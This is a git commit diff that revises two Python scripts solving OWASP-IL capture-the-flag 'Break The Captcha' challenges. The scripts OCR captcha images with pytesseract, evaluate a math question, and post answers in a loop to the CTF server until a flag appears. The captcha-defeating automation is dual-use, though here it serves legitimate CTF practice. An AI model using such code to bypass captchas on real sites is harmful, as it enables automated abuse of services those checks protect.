3a8ac52fe49642a04c2e7d65f8dfda7ab8c846f9
Roman Zaikin <romans5427173@gmail.com>
2018-10-13 12:18:07 +0300

    alcatraz solution added
    alcatraz solution added

--- Break The Captcha - Nightmare.py
+++ Break The Captcha - Nightmare.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python
-from PIL import Image, PngImagePlugin, ImageFile
+from PIL import Image
 
 import requests
 import pytesseract
@@ -9,29 +9,26 @@ import numexpr
 
 
 def fix_captcha():
-    ImageFile.LOAD_TRUNCATED_IMAGES = True
-    png_file = PngImagePlugin.Image.open('captcha.png')
-    width, height = png_file.size
+    captcha_file = Image.open('captcha.png')
+    width, height = captcha_file.size
+    new_width = 55
 
     for i in xrange(height):
-        # change captcha colors to work better with tesseract
-        for k in xrange(width):
-            ab = png_file.getpixel((k, i))
-            if ab[0] != 255 or ab[1] != 255 or ab[2] != 255:
-                png_file.putpixel((k, i), (255, 255, 255))
+        for k in xrange(new_width):
+            if captcha_file.getpixel((k, i)) == (255, 255, 255):
+                captcha_file.putpixel((k, i), (0, 0, 0))
             else:
-                png_file.putpixel((k, i), (0, 0, 0))
+                captcha_file.putpixel((k, i), (255, 255, 255))
 
-    png_file.save("captcha2.png")
+    new_image = captcha_file.crop((0, 0, new_width, height))
+    new_image.save("captcha2.png")
 
     text = pytesseract.image_to_string(Image.open('captcha2.png'))
-
-    # clean bad characters from captcha for example (space, backtick and so)
     return "".join(map(lambda data: data if data in string.ascii_letters or data in string.digits else "", text))
 
 
 def get_captcha():
-    response = requests.get(captcha_url, cookies=cookies)
+    response = session.get(captcha_url)
 
     if response.status_code == 200:
         with open("captcha.png", 'wb') as f:
@@ -40,20 +37,22 @@ def get_captcha():
 
 def get_number(response=None):
     if not response:
-        response = requests.get(number_url, stream=True)
+        response = session.get(number_url, stream=True)
 
     for line in response.iter_lines():
         if "math_question" in line:
             re_value = re.search(">(.*?)=", line).group(1)
             return numexpr.evaluate(re_value).item()
 
+
 #
 # Global Configurations
 #
 number_url = 'http://challenges.owaspil.ctf.today:8085/'
 captcha_url = "http://challenges.owaspil.ctf.today:8085/captcha.php"
-cookies = dict(PHPSESSID="d2b86e03ba22bb52b850a6670da284ac")
 headers = {'content-type': 'application/x-www-form-urlencoded'}
+session = requests.session()
+success_counter = 1
 
 number = get_number()
 
@@ -61,22 +60,23 @@ while True:
     get_captcha()
     captcha = fix_captcha()
 
-    response = requests.post(number_url,
-                      cookies= cookies,
-                      data= "captcha={0}&math_captcha={1}&submit=".format(captcha, number),
-                      headers= headers,
-                      stream= True)
+    response = session.post(number_url,
+                            data="captcha={0}&math_captcha={1}&submit=".format(captcha, number),
+                            headers=headers,
+                            stream=True)
 
     if "Oh snap! you are wrong!" in response.text:
         print "[-] Bad captcha!"
+        raw_input(">>")
+
     elif "Correct!" in response.text:
-        print "[+] Correct!"
+        print "[+] Correct! | counter:{0}".format(success_counter)
+        success_counter += 1
     else:
         flag = re.search("{(.+?)}", response.text).group(1)
         print "[*] FLAG: OWASP-IL{{{0}}}".format(flag)
 
         raw_input("[*] Done!")
-
 
     # set new number
     number = get_number(response)
--- Break The Captcha.py
+++ Break The Captcha.py
@@ -11,24 +11,28 @@ def get_captcha():
 
 
 def get_image():
-    response = requests.get(captcha_url, cookies=cookies)
+    response = session.get(captcha_url, cookies=cookies)
     if response.status_code == 200:
         with open("a.png", 'wb') as f:
             f.write(response.content)
+
 
 #
 # Global Configurations
 #
 url = 'http://challenges.owaspil.ctf.today:8088/'
 captcha_url = "http://challenges.owaspil.ctf.today:8088/captcha.php"
-cookies = dict(PHPSESSID="79ee09d15fa4acf22b1b8fcfae430539")
+session = requests.session()
 headers = {'content-type': 'application/x-www-form-urlencoded'}
 
 while True:
     get_image()
     code = get_captcha()
 
-    response = requests.post(url, cookies=cookies, data="captcha={0}&submit=".format(code), headers=headers)
+    response = session.post(url,
+                            data="captcha={0}&submit=".format(code),
+                            headers=headers)
+
     if "Oh snap! you are wrong!" in response.text:
         print "[-] Bad captcha!"
     elif "Correct!" in response.text:
@@ -38,6 +42,3 @@ while True:
         print "[*] FLAG: OWASP-IL{{{0}}}".format(flag)
 
         raw_input("[*] Done!")
-
-
-
